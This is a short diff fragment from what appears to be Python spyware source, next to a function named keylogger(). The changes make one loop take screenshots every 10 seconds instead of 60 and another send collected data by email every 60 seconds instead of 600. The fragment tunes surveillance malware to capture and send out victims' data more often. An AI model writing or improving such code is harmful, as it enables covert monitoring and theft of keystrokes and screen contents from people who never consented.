@@ -11,13 +11,13 @@ def keylogger():
 
 def screen():
     while True:
-        time.sleep(60)
+        time.sleep(10)
         PrintScreen.take_screen()
 
 
 def email():
     while True:
-        time.sleep(600)
+        time.sleep(60)
         Email_Connection.sendmail()
 
 
